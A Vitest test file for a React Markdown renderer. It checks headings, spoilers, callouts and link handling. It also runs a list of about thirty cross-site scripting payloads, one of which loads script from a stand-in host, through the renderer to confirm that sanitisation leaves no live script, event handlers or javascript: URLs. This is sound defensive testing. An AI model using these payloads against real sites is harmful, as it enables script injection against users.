import { renderToStaticMarkup } from "react-dom/server";
import { describe, expect, it } from "vitest";
import { MarkdownRenderer } from "./markdown-renderer";

const render = (source: string, citations = 0) =>
  renderToStaticMarkup(<MarkdownRenderer source={source} citations={citations} />);

describe("MarkdownRenderer", () => {
  it("gives h2/h3 readable ids and self-links", () => {
    const html = render("## Getting started\n\n### Save often");
    expect(html).toContain(
      '<h2 id="getting-started"><a href="#getting-started" class="heading-anchor">Getting started</a></h2>',
    );
    expect(html).toContain('<h3 id="save-often">');
  });

  it("demotes a markdown h1 so the page keeps a single h1", () => {
    const html = render("# Title in body");
    expect(html).not.toContain("<h1");
    expect(html).toContain('<h2 id="title-in-body">');
  });

  it("renders spoilers hidden by default with accessible controls", () => {
    const inline = render("It was ||the butler||.");
    expect(inline).toContain('data-spoiler-state="hidden"');
    expect(inline).toContain('aria-expanded="false"');
    expect(inline).toContain('aria-hidden="true"');

    const block = render("||A whole paragraph of spoilers.||");
    expect(block).toContain("Show spoiler");
    expect(block).toContain("inert");
  });

  it("renders callouts, tables and citations", () => {
    const html = render("> [!WARNING]\n> Careful.\n\n| a | b |\n|---|---|\n| 1 | 2 |\n\nAnswer [1].", 1);
    expect(html).toContain('class="callout callout-warning"');
    expect(html).toContain("<table>");
    expect(html).toContain('class="citation-chip"');
  });

  it("marks external links as untrusted and leaves internal ones alone", () => {
    const html = render("[out](https://example.com) and [in](/tips)");
    expect(html).toContain('<a href="https://example.com" rel="noopener noreferrer nofollow ugc">out</a>');
    expect(html).toContain('<a href="/tips">in</a>');
  });

  it("never outputs script, event handlers or javascript: URLs", () => {
    const html = render(
      '<script>alert(1)</script>\n\n<img src=x onerror=alert(1)>\n\n[x](javascript:alert(1))\n\n<a href="#" onclick="x()">y</a>',
    );
    expect(html).not.toMatch(/<script|onerror=|javascript:|onclick=/i);
  });
});

/**
 * Phase 10: an XSS payload list through every flavour of the pipeline (articles with ::youtube,
 * forum posts with mentions, AI answers with citations). Raw HTML is never parsed (no rehype-raw)
 * and rehype-sanitize runs after our plugins, so none of these may produce live markup.
 */
describe("MarkdownRenderer XSS payloads", () => {
  const payloads: Record<string, string> = {
    script: "<script>alert(1)</script>",
    scriptUpper: "<SCRIPT SRC=//evil.example/x.js></SCRIPT>",
    imgOnerror: '<img src=x onerror="alert(1)">',
    svgOnload: "<svg/onload=alert(1)>",
    iframe: '<iframe src="javascript:alert(1)"></iframe>',
    style: "<style>body{background:url(javascript:alert(1))}</style>",
    object: '<object data="data:text/html,<script>alert(1)</script>"></object>',
    formAction: '<form action="javascript:alert(1)"><button>go</button></form>',
    metaRefresh: '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
    linkJs: "[click](javascript:alert(1))",
    linkJsMixedCase: "[click](JaVaScRiPt:alert(1))",
    linkJsEntity: "[click](&#106;avascript:alert(1))",
    linkJsSpaced: "[click]( javascript:alert(1))",
    linkJsTab: "[click](java\tscript:alert(1))",
    linkVbscript: "[click](vbscript:msgbox(1))",
    linkData: "[click](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)",
    autolinkJs: "<javascript:alert(1)>",
    referenceJs: "[click][x]\n\n[x]: javascript:alert(1)",
    imageJs: "![a](javascript:alert(1))",
    imageOnerrorAlt: '![x" onerror="alert(1)](https://example.com/a.png)',
    titleBreakout: '[a](https://example.com "x\\" onmouseover=\\"alert(1)")',
    htmlInSpoiler: "||<img src=x onerror=alert(1)>||",
    blockSpoilerHtml: "||<script>alert(1)</script> and more||",
    calloutHtml: "> [!NOTE]\n> <img src=x onerror=alert(1)>",
    calloutTypeInjection: '> [!NOTE" onclick="alert(1)]\n> text',
    youtubeBadId: '::youtube[x" onerror="alert(1)]',
    youtubeJs: "::youtube[javascript:alert(1)]",
    mentionInjection: '@user" onmouseover="alert(1)',
    citationInjection: 'Answer [1" onclick="alert(1)].',
    footnoteClobber: "Text[^__proto__]\n\n[^__proto__]: <img src=x onerror=alert(1)>",
    tableHtml: "| a |\n|---|\n| <img src=x onerror=alert(1)> |",
    htmlComment: "<!-- <script>alert(1)</script> -->",
    entityScript: "&lt;script&gt;alert(1)&lt;/script&gt;",
    nullByte: "<scr\u0000ipt>alert(1)</script>",
  };

  // Only real tags and attribute names count: escaped text ("&lt;img onerror=…") and quotes
  // escaped inside an attribute value (alt="x&quot; onerror=…") are inert. Our own markup is
  // allowed: React's image preload, and the spoiler's lucide icon and reveal button.
  const BAD_TAG = /^<(script|iframe|object|embed|style|form|meta|svg|math|base|link|frame|input|button)\b/i;
  const OURS = [
    /^<link rel="preload" as="image" href="https:\/\/[^"]+"[^>]*>$/,
    /^<svg [^>]*class="lucide lucide-[a-z-]+ /,
    /^<button data-slot="button" [^>]*type="button"/,
  ];
  function dangers(html: string): string[] {
    const found: string[] = [];
    for (const [tag] of html.matchAll(/<[a-z][^>]*>/gi)) {
      if (BAD_TAG.test(tag) && !OURS.some((pattern) => pattern.test(tag))) found.push(tag);
      const names = tag.replace(/="[^"]*"/g, "");
      if (/\son[a-z]+\b/i.test(names)) found.push(tag);
      if (/\s(href|src|action|data|formaction|srcset|poster)="\s*(javascript|vbscript|data):/i.test(tag))
        found.push(tag);
    }
    return found;
  }

  for (const [name, source] of Object.entries(payloads)) {
    it(name, () => {
      for (const html of [
        render(source),
        render(source, 3),
        renderToStaticMarkup(<MarkdownRenderer source={source} mentions size="sm" />),
        renderToStaticMarkup(<MarkdownRenderer source={source} youtube />),
      ]) {
        expect(dangers(html)).toEqual([]);
        // Any id from user text is prefixed (user-content-) so it can't clobber the page's own ids.
        for (const [, id] of html.matchAll(/\sid="([^"]+)"/g)) {
          // Allowed: sanitize's prefix, rehype-slug's heading slugs, React's useId (the spoiler).
          expect(id.startsWith("user-content-") || /^[a-z0-9-]+$/.test(id) || /^_R_\w*_$/.test(id)).toBe(true);
        }
      }
    });
  }
});
